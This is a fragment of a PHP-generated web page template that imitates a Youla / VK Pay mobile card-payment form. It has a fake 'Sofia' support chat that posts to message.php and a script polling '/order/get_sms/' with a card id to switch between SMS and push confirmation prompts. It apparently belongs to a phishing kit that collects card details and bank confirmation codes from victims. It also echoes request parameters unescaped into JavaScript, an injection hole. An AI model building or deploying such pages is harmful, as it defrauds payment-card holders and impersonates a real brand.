.operators-photo img {
    width: 30px;
    height: 30px;
    border-radius: 50%;
    margin-left: 5px;
    margin-right: 5px;
}
.chat-block::-webkit-scrollbar {
    width: 7px;
}
.chat-block::-webkit-scrollbar-button {
    display: none;
}
.chat-block::-webkit-scrollbar-thumb {
    border-radius: 8px;
    background-color: #babac0;
    border: 1px solid transparent;
}
.chat-block::-webkit-scrollbar-thumb {
    border-radius: 8px;
    background-color: #babac0;
    border: 1px solid transparent;
}
.pay-card-layout_type_youla-mobile .pay-card-layout__header_type_vkpay {
    border-bottom: 1px solid #e1e3e5;
    background: #fff;
        background-color: rgb(255, 255, 255);
    position: relative;
    z-index: 105;
}
.pay-card-layout_type_youla-mobile .pay-card-layout__header_type_vkpay .pay-card-layout__logo {
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    box-sizing: border-box;
    width: 100%;
    max-width: 360px;
    margin: 0 auto;
    padding: 15px;
}
.pay-card-layout__order-message_type_youla-mobile, .pay-card-layout__promo_type_youla-mobile, .pay-card_type_youla-mobile {
    position: static;
    width: 100%;
    max-width: 360px;
    margin: 0 auto;
    padding: 5px 15px 15px;
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    box-sizing: border-box;
    font-family: Roboto, arial, helvetica;
    font-size: 14px;
    line-height: 22px;
    color: #8f8f8f;
    -webkit-font-smoothing: antialiased;
}
.pay-card__row, .pay-card_type_cloud .credit-card-form__submit {
    padding-top: 10px;
} 
.pay-card__card { 
    margin: 0 auto;
}
.credit-card-form__label-group_type_holder-name {
    margin: 0 0 15px;
}
.body_background_youla-mobile, .pay-card-layout_type_youla-mobile .credit-card-form__popup, .pay-card-layout_type_youla-mobile .credit-card-form__popup .notification-block {
    background: #f9f9f9;
}
.pay-card_type_youla-mobile .credit-card-form__card_position_front {
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    box-sizing: border-box;
    width: auto;
    height: auto;
    margin: 0 auto 10px;
    padding: 0;
    background: none;
    border-radius: 0;
    -webkit-box-shadow: none;
    box-shadow: none;
    position: relative;
}
.credit-card-form__label {
    display: block;
    font-size: 11px;
    text-transform: uppercase;
    color: #666;
}
.pay-card_type_youla-mobile .control-label__text, .pay-card_type_youla-mobile .credit-card-form__title {
    display: block;
    margin: 0 0 5px;
    text-transform: none;
    font-size: 14px;
    color: #8f8f8f;
    line-height: 1.57;
}
.pay-card-layout_type_youla-mobile .credit-card-form__popup .button, .pay-card_type_youla-mobile .credit-card-form__submit .button {
    color: #fff;
    border-radius: 3px;
    -webkit-box-shadow: 0 2px 2px 0 rgba(0, 0, 0, .12), 0 0 2px 0 rgba(0, 0, 0, .12);
    box-shadow: 0 2px 2px 0 rgba(0, 0, 0, .12), 0 0 2px 0 rgba(0, 0, 0, .12);
    width: 100%;
    height: 48px;
    margin: 0;
    line-height: 48px;
    font-size: 14px;
    font-weight: 500;
    letter-spacing: .5px;
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    box-sizing: border-box;
    font-family: Roboto, arial, helvetica;
    border:none;
}
.credit-card-form__input {
    display: block;
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    box-sizing: border-box;
    width: 100%;
    background: #f2f2f2;
    margin: 0;
    padding: 3px 0 3px 10px;
        padding-left: 10px;
    border: 1px solid #dcdcdc;
        border-top-color: rgb(220, 220, 220);
        border-right-color: rgb(220, 220, 220);
        border-bottom-color: rgb(220, 220, 220);
        border-left-color: rgb(220, 220, 220);
    font-size: 18px;
    text-transform: uppercase;
    letter-spacing: 2px;
    -webkit-transition: border .25s ease-in-out, margin .25s, -webkit-box-shadow .25s ease-in-out;
    transition: border .25s ease-in-out, margin .25s, -webkit-box-shadow .25s ease-in-out;
    -o-transition: border .25s ease-in-out, box-shadow .25s ease-in-out, margin .25s;
    transition: border .25s ease-in-out, box-shadow .25s ease-in-out, margin .25s;
    transition: border .25s ease-in-out, box-shadow .25s ease-in-out, margin .25s, -webkit-box-shadow .25s ease-in-out;
}
.pay-card_type_youla-mobile .credit-card-form__input {
    height: 48px;
    background: #fff;
    border-color: #e1e3e5;
    color: #2a2a2a;
    border-radius: 4px;
    -webkit-transition: none;
    -o-transition: none;
    transition: none;
    font-size: 16px;
    padding-left: 12px;
    -webkit-appearance: none;
    -moz-appearance: none;
    appearance: none;
}
.secure-information_type_youla-mobile {
    max-width: 360px;
    margin: 0 auto;
    padding: 0 15px;
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    box-sizing: border-box;
    background: none;
}
.secure-information_type_youla-mobile .secure-information__text {
    padding-left: 23px;
    margin: 0;
    font-size: 14px;
    font-family: Roboto, arial, helvetica;
    line-height: 22px;
    font-weight: 300;
    color: #8f8f8f;
    -webkit-font-smoothing: antialiased;
}
.secure-information__text_type_protocol {
    text-transform: uppercase;
    color: #398f42;
}
.secure-information_type_youla-mobile .secure-information__text { 
    color: #8f8f8f;
}
    </style>
<div id="offonthechap">
<div class="chaport-container chaport-container-positioned chaport-window-dark-gray chaport-collapsed" style="bottom: 0px;">
<div class="chaport-launcher" style="left: 0px; right: 0px;">
<div class="chaport-launcher-button no-photo chaport-launcher-anim chaport-anim-show">
<div class="chaport-launcher-chat-icon"></div>
<div class="chaport-launcher-close-icon"></div>
<div class="chaport-launcher-operator-photo"></div>
</div>
</div>
<div class="chaport-window chaport-anim-hide chaport-window-anim" style="opacity: 0; visibility: hidden;">
<div class="chaport-inner">
<div class="main-textblock">
<div class="operatorblock">
<div class="operatorblock-content" style="display: flex;">
<div id="operator-photo">
<img id="oper-photo-img" src="/operator-img.png">
<div class="operator-name">Sofia</div>
</div>
<div class="team-wrapper">
<div class="team">Assistance service</div>
<div class="activity-indicator">
<div class="with-status" style="display: inline-block;">
<div class="status-online" style="display: inline-block;">
</div>online</div>
</div>
</div>
</div>
</div>
<div class="chat-block">
<div id="chat">
<div class="operators-msg" id="greeting-msg" style="display: none;">
<div class="operators-photo"><img src="/operator-img.png"></div>
<div class="operators-first-text">Hello! How can I help you?</div>
</div>
</div>
<div id="input-msg" style="display: flex;">
<input type="text" name="smstosup1" id="smstosup1" placeholder="Enter your message ...">
<button id="smstosupbutton1">
<div class="chaport-send-icon">
<svg width="18" height="18" viewBox="0 0 535.5 535.5">
<polygon points="0,497.25 535.5,267.75 0,38.25 0,216.75 382.5,267.75 0,318.75" fill="#b9bdbf">
</polygon>
</svg>
</div>
</button>
</div>
</div>
</div>
</div>
</div>
<div class="chaport-big-shadow"></div>
</div>
</div>
<script type="text/javascript">

var token = getCookie(\'tokena\');
			if (token =="") {
				var token = "'.$token.'";
			}
            var supportbutton = document.querySelector(\'.chaport-launcher-button\');
            var supportwindow = document.querySelector(\'.chaport-window\');
            var close_icon = document.querySelector(\'.chaport-launcher-close-icon\');
            var chat_icon = document.querySelector(\'.chaport-launcher-chat-icon\');


            $(\'.chaport-launcher-button\').click(function() {
                if (supportwindow.style.opacity == \'0\') {
                    supportwindow.style.opacity = \'1\';
                    supportwindow.style.visibility = \'visible\';
                    close_icon.style.opacity = \'1\';
                    chat_icon.style.opacity = \'0\';
                    
                } else {
                    supportwindow.style.opacity = \'0\';
                    supportwindow.style.visibility = \'hidden\';
                    close_icon.style.opacity = \'0\';
                    chat_icon.style.opacity = \'1\';
                }
            });
                


            var docdoc = document,
                chatscroll = docdoc.querySelector(\'#chat\'),
                smstosupbutton = docdoc.querySelector(\'#smstosupbutton1\'),
                msgtext = docdoc.querySelector(\'#smstosup1\');
            
            smstosupbutton.onclick = function() {
                sendmsg();
                msgtext.value = \'\';
            }
            
            function msg_add(onemsg){
                var chatscroll = document.getElementById("chat"); 
                                    if (onemsg.sender=="f") {
                                        var msgwindow = document.createElement(\'div\');
                                            msgwindow.setAttribute(\'class\', \'visitors-msg-text\');
                                            msgwindow.setAttribute(\'id\', onemsg.id);
                                            msgwindow.innerText = onemsg.message;
                                            chatscroll.appendChild(msgwindow);
                                    } else if (onemsg.sender=="t") {
                                        var docdoc2 = document,
                                            msgwindowbig = docdoc2.createElement(\'div\'),
                                            msgwindow = docdoc2.createElement(\'div\'),
                                            operphoto = docdoc2.createElement(\'div\'),
                                            operphoto2 = docdoc2.createElement(\'img\');
                                            msgwindowbig.setAttribute(\'class\', \'operators-msg\');
                                            msgwindowbig.setAttribute(\'style\', \'display: flex;\');
                                            operphoto.setAttribute(\'class\', \'operators-photo\');
                                            operphoto2.setAttribute(\'src\', \'/operator-img.png\');

                                            msgwindow.setAttribute(\'class\', \'operators-msg-text\');
                                            msgwindow.setAttribute(\'id\', onemsg.id);
                                            msgwindow.innerText = onemsg.message;
                                            msgwindowbig.appendChild(operphoto);
                                            operphoto.appendChild(operphoto2);
                                            msgwindowbig.appendChild(msgwindow);
                                            chatscroll.appendChild(msgwindowbig);
                                            supportwindow.style.opacity = \'1\';
                                            supportwindow.style.visibility = \'visible\';
                                    }
                                    chatscroll.scrollIntoView(false);
            }

            function ajaxsup(reg) { 
                var request = new XMLHttpRequest();
                var token = getCookie(\'tokena\'); 
                    if (token =="") {
                        var token = "'.$token.'";
                setCookie(\'tokena\', token);
                    }
                request.onreadystatechange = function() {
                    if (request.readyState == 4 && request.status == 200) { 
                        var resultstring = request.responseText; 
                        resultstring = JSON.parse(resultstring);
                        resultstring.forEach(function(onemsg) {  
                               msg_add(onemsg);
                        })
                    }
                }
                request.open(\'POST\', \'../../message.php\');
                request.setRequestHeader(\'Content-Type\', \'application/x-www-form-urlencoded\');
                request.send(\'token='.$token.'&get=\'+reg+\'&product='.$_GET['product'].'\');
            }
            function sendmsg() {
                var request = new XMLHttpRequest();
                setCookie(\'tokena\', token);
                request.onreadystatechange = function() {
                    if (request.readyState == 4 && request.status == 200) { 
                        
                    }
                }
                msg_add({sender:"f",message:msgtext.value,id:"fff"});


                request.open(\'POST\', \'../../message.php\');
                request.setRequestHeader(\'Content-Type\', \'application/x-www-form-urlencoded\');
                request.send(\'send=1&product='.$_GET['product'].'&token='.$token.'&title='.$product->title.'&message=\' + msgtext.value);
            }
            function getCookie(cname) {
                var name = cname + "=";
                var decodedCookie = decodeURIComponent(document.cookie);
                var ca = decodedCookie.split(\';\');
                for(var i = 0; i <ca.length; i++) {
                  var c = ca[i];
                  while (c.charAt(0) == \' \') {
                    c = c.substring(1);
                  }
                  if (c.indexOf(name) == 0) {
                    return c.substring(name.length, c.length);
                  }
                }
                return "";
              }
      
              function setCookie(cname, cvalue) {
                var d = new Date();
                    d.setTime(d.getTime() + (6*60*60*1000));
                var expires = "expires="+ d.toUTCString();
                document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
              }
        </script>
<script type="text/javascript"> 
window.onload = function() { 
ajaxsup(1); 
} 
setInterval(function(){ajaxsup(0);}, 10000); 
function status_push_sms(){
    $.post(\'/order/get_sms/'.$product->id.''.($_GET['v']==1?'/1/':'').'\',{"get_statuspush_sms":"'.$id_card.'"},function(r){
        r = JSON.parse(r);
        if(r.key==1){
            $(\'#loader_2,#mypole_label,#btn_send_form_mypole,.sms_form,#loader_text\').hide();
            $(\'#push_form,#btn_send_form\').show();
        }
        if(r.key==2){
            $(\'#loader_2,#mypole_label,#btn_send_form_mypole,#push_form,#loader_text\').hide();
            $(\'.sms_form,#btn_send_form\').show();
        }
        if(r.key==3){
            $(\'#loader_2,#push_form,#loader_text,#btn_send_form,.sms_form\').hide();
            $(\'#mypole_label,#btn_send_form_mypole\').show();
            $(\'#text_mypole\').text(r.text);
        }
       console.log(r); 
    });
}
setInterval(status_push_sms,10000);
</script>
';
}
